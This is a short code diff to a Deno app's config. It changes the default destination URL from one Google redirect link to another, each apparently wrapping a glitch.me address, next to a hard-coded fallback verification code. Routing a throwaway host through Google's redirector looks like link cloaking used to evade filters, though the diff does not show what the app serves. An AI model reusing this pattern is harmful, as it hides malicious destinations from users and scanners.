@@ -11,7 +11,7 @@ interface AppConfig {
 }
 
 const CONFIG: AppConfig = {
-  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://www.google.com/url?q=https%3A%2F%2Fcord-jeweled-lime.glitch.me%2F&sa=D&sntz=1&usg=AOvVaw36wzNRNNu6rU3qkugl1UGY",
+  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "http://www.google.com/url?q=http%3A%2F%2Ffew-equinox-aardvark.glitch.me&sa=D&sntz=1&usg=AOvVaw14Yz-jA744I96WiGgWFLUP",
   VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
   PORT: Number(Deno.env.get("PORT")) || 8000,
   SESSION_TIMEOUT: 15 * 60 * 1000, // 15 minutes in milliseconds
